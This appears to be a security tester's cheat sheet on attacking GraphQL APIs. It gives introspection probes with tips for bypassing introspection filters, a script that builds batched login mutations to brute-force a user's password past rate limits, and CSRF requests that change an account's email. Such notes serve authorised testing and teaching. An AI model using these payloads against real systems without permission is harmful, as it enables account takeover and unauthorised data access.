
Burp Extensions: GraphQL Raider

Fingerprint:
- Send `query{__typename}`  to receive `{"data": {"__typename": "query"}}`. `__typename` is a reserved query field which is used to get object type as a string.
- If JSON-based GraphQL engine such as Apollo is used, send `{"query":"query {__typename}"}` or `[{"query":"query {__typename}"}]` instead.
- Notice `query not present` error in response.

Notice that some applications use Persisted Queries extension which allows a client to send only a predefined queries as hashes.  
### Syntax

GraphQL server validates all user queries upon a schema. User queries can be anything as long as their fields are compatible with the schema. Fields can be scalars, such as a `String` or `Int`, user-defined objects or fragments (a syntax feature that represents a set of fields).

`human(id: "1000")`  is called an inline literal. This notation is not allowed to use inside the variable definitions block.

There are also wrapping types like lists and `!`: 
```graphql
type Query {
  users: [User]         # a list of users
  topScores: [Int!]!    # a non-null list of non-null integers
}
```
And abstract types like interfaces and unions:

```graphql
# schema

interface Content {
  id: ID!
  title: String!
  createdAt: String!
}

type Post implements Content {
  id: ID!
  title: String!
  createdAt: String!
  body: String  # Extra field
}

type Video implements Content {
  id: ID!
  title: String!
  createdAt: String!
  duration: Int  # Extra field
}

# query

type Query {
  feed: [Content!]! 
}
```

GraphQL operations include quieries, mutations and subscriptions. Query should include the `query` operation type for reading operations or `mutation` for modifying operations and arbitrary operation name. Mutations always require input, meanwhile in queries it can be used to catch up a specific object instead of a group.  Mutations must be declared in the schema to perform data manipulation. The best security practice is to use input types instead of scalars:
```graphql
type User {
  id: ID! # can't be modified by updateLogin
  login: String!
  passhash: String! # can't be modified by updateLogin
}

input UserInput {
  login: String!
}

type Mutation {
  updateLogin(input: UserInput!): User
}
```

Queries or a schema can include directives to change how that specific part of the query is executed or validated by the server. For example:

```graphql
query GetUser($withEmail: Boolean!) {
  user(id: "1") {
    name
    email @include(if: $withEmail)
  }
}
```

`@rateLimit` is a schema directive which can guard off query batching attacks. 

`@auth` is a custom schema directive which is provided by some middleware to handle authorization. It proceeds with the query only if the provided JWT token contains required fields, like user role.


# Vulnerabilities

Typical vulnerabilities are:
- Schema introspection
- Type suggestions
- Rate limiting bypass via nested queries (query batching)
- CSRF if data is passed via GET request or the server supports `application/x-www-form-urlencoded`
- Any authorization problems, such as IDOR

#### Introspection query

Probe request

```graphql
{
	"query": "{__schema{queryType{name}}}"
}
```
If it doesn't work,  try to insert spaces characters and commas (these are ignored by GraphQL) after `__schema` keyword in case developers restricted introspection only by a regex. Also try changing HTTP methods and content type.

Full request
```graphql
query IntrospectionQuery { 
	__schema { 
		queryType { 
			name 
	} 
	mutationType { 
		name 
	} 
	subscriptionType { 
		name 
	} 
	types { 
		...FullType 
	} 
	directives { 
		name 
		description 
		args { ...InputValue } 
		onOperation #Often needs to be deleted to run query 
		onFragment #Often needs to be deleted to run query 
		onField #Often needs to be deleted to run query } 
	}}
fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
```

Look at the graph at [GraphQL Visualizer](https://nathanrandal.com/graphql-visualizer)

#### Suggestions bruteforce

Enabled suggestions can disclose schema information even if introspection is disabled.
Use [Clairvoyance](https://github.com/nikitastuptin/clairvoyance) with [some wordlist](https://github.com/Escape-Technologies/graphql-wordlist) .

#### Other ways to obtain valid queries

Inspect JavaScript files (even the minified ones!) to find any valid GraphQL queries

#### Query batching

There are two possible ways to perform query batching.
The first one is simple and predictable for JSON-based endpoints:
```gql
[
	{
	"query":"mutation sendCode1($input1){result}",
	"variables": {
		"input1":"0001"
		}
	},
	{
	"query":"mutation sendCode2($input2){result}",
	"variables": {
		"input2":"0002"
		}
	}
]
```
The second one is based upon using aliases:
```gql
mutation BatchChangeObj($input1: InputObj!, $input2: InputObj!) {
    FOO: changeObj(input: $input1) {
        id
        }
    BAR: changeObj(input: $input2) {
        id
        }
    }
```
Notice: you can replace object variables with inline literal. 

To generate a batch request, you can try
```js
copy(PASSLISTCSVSTRING.split(',').map((element,index)=>` bruteforce$index:login(input:{password: "$password", username: "carlos"}) { token success } `.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```
Which results in 
```graphql
mutation { 
	bruteforce0:login(input:{password: "123456", username: "carlos"}) { 
	token 
	success 
	} 
	bruteforce1:login(input:{password: "password", username: "carlos"}) { 
		token 
		success 
	}
...
```

#### CSRF

```http
POST /graphql/v1 HTTP/2
Host: lab.com
Content-Type: application/x-www-urlencoded
Content-Length: 66

query=mutation+{changeEmail(input:{email:"test@test.com"}){email}}
```

```http
GET /api/?query=mutation%20%7bchangeEmail%28input:$input%29%7bemail%7d%7d&variables=%7b%22email%22%3a%22test@test.com%22%7d HTTP/2
Host: lab.com


```
### See also
- https://0xn3va.gitbook.io/cheat-sheets/web-application/graphql-vulnerabilities
- https://lab.wallarm.com/graphql-batching-attack/
- https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- https://www.vaadata.com/blog/graphql-api-vulnerabilities-common-attacks-and-security-tips/